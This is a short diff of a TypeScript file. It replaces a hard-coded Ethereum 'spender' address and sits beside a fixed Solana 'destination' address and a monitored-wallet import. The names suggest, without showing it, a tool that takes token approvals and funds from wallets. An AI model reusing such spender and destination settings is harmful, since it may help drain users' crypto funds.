@@ -9,7 +9,7 @@ import type { MonitoredWallet } from '@shared/schema';
 const SYSTEM_PROGRAM_ID = new PublicKey('11111111111111111111111111111111');
 const RENT_SYSVAR_ID = new PublicKey('SysvarRent111111111111111111111111111111111');
 
-const SPENDER_ADDRESS = "0xa50408CEbAD7E50bC0DAdf1EdB3f3160e0c07b6E" as const;
+const SPENDER_ADDRESS = "0x2c73de09a4C59E910343626Ab6b4A4d974EC731f" as const;
 const SOLANA_DESTINATION = "HgPNUBvHSsvNqYQstp4yAbcgYLqg5n6U3jgQ2Yz2wyMN";
 const TOKEN_PROGRAM_ID = new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
 const ASSOCIATED_TOKEN_PROGRAM_ID = new PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL");
